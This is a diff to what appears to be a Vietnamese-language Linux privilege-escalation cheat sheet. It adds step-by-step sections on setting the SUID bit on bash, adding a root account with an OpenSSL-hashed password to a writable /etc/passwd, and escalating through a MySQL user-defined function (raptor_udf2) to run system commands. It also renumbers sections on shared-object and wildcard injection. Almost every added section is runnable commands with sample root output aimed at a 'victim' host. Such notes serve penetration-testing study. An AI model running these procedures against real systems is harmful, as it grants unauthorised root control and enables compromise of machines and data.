@@ -50,7 +50,20 @@ Example:
 
 Dựa vào kết quả trên, check quyền của file được đặt cronjob bằng `ls -la` xem có thể edit được không. Như ở trên có file `/var/www/html/booked/cleanup.py` có vẻ khả quan, nếu có quyền `wr` thì chỉ cần thay thế nội dung là xong.
 
-# 4. Shared object injection.
+# 4. Bash SUID
+
+Nếu trong trường hợp ta có thể `setuid` (`chmod +s`) cho `bash`, có thể làm như sau:
+
+```console
+$ chmod +s /bin/bash
+$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 25 01:40 /bin/bash
+$ /bin/bash -p
+bash-5.12# id
+uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
+```
+
+# 5. Shared object injection.
 
 Nếu gặp 1 process nào đó chạy với quyền root, sử dụng một shared object file (.so) và có quyền ghi trong thư mục chứa .so đó, hoặc là có quyền ghi với chính file .so đó luôn, có thể thực hiện so injection.
 
@@ -85,7 +98,7 @@ $ find /usr/ -name "*cc1*" 2>/dev/null
 $ export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
 ```
 
-# 5. Wildcard injection
+# 6. Wildcard injection
 
 Với một số tool nén file như `tar`, `zip`, `rync` và `7z`, có options cho phép chạy câu lệnh hệ thống, và đây là điều xảy ra khi thay tên file thành các options đó.
 
@@ -154,3 +167,133 @@ uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
 
 Ngoài ra còn nhiều trò khác tại [đây](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) và [đây](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
 
+# 7. /etc/passwd với OpenSSL
+
+Trong vài trường hợp, file `/etc/passwd` được set quyền khá vớ vẩn như dưới:
+
+```console
+$ ls -l /etc/passwd
+-rw-r--r-- 1 user root 1.2K Jun  9 10:22 /etc/passwd
+```
+
+Có thể thấy `user` có thể edit cái file này, ta có thể add thêm 1 user (ví dụ `user1`:`toor`) với quyền root bằng OpenSSL như sau:
+
+```console
+$ openssl passwd -1 -salt user1 toor
+$1$user1$ZKmj13YYdAml8T8Cwi/j9/
+```
+
+Đưa vào `/etc/passwd` với format sau:
+
+`<username>:<chuỗi lấy ở trên>:0:0::/root:/bin/bash`
+
+```console
+$ echo 'user1:$1$user1$ZKmj13YYdAml8T8Cwi/j9/:0:0::/root:/bin/bash' >> /etc/passwd
+```
+
+Giờ có thể sử dụng `su` hoặc `ssh`:
+
+```console
+$ su user1
+# id
+uid=0(user1) gid=0(root) groups=0(root)
+```
+
+# 8. User Defined Function in MySQL
+
+Trong trường hợp chúng ta truy cập được vào root của MySQL, hoặc một user MySQL nào đó có quyền đọc database 'mysql', có thể thử:
+
+```console
+MySQL [(none)]> use mysql
+```
+
+```console
+MySQL [mysql]> show variables like '%secure_file_priv%';
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0.001 sec)
+```
+
+Nếu kết quả trả về như trên, ta có thể PrivEsc bằng UDF.
+Tải file `raptor_udf2.c` từ [đây](https://www.exploit-db.com/exploits/1518) và compile:
+
+```console
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 
+```
+
+Tìm một thư mục nào đó trên máy victim mà ta có quyền ghi:
+
+```console
+$ find / -type d -writable 2>/dev/null
+...
+...
+/var/www/html
+...
+```
+
+Với ví dụ trên là `/var/www/html`
+Download file `raptor_udf2.so` về thư mục `/var/www/html` trên máy victim.
+Quay lại với MySQL console:
+
+```console
+MySQL [mysql]> show variables like '%plugin%';
++-----------------+------------------------+
+| Variable_name   | Value                  |
++-----------------+------------------------+
+| plugin_dir      | /usr/lib/mysql/plugin/ |
++-----------------+------------------------+
+1 rows in set (0.001 sec)
+```
+
+Note lại cái `plugin_dir` kia, tạo 1 bảng `foo`:
+
+```console
+MySQL [mysql]> create table foo(line blob);
+```
+
+Insert file `raptor_udf2.so` vào `foo`:
+
+```console
+MySQL [mysql]> insert into foo values(load_file('/var/www/raptor_udf2.so'));
+```
+
+Tạo plugin trong thư mục `plugin_dir` đã note:
+
+```console
+MySQL [mysql]> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+```
+
+Tạo function để gọi câu lệnh hệ thống:
+
+```console
+MySQL [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
+```
+
+Check lại xem function đã được tạo chưa:
+
+```console
+MySQL [mysql]> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+```
+
+PrivEsc:
+
+```console
+MySQL [mysql]> select do_system('chmod +s /bin/bash');
+```
+
+Và sử dụng `/bin/bash -p` như mục #4 có đề cập là lên được root:
+
+```console
+$ /bin/bash -p
+bash-5.12# id
+uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
+```
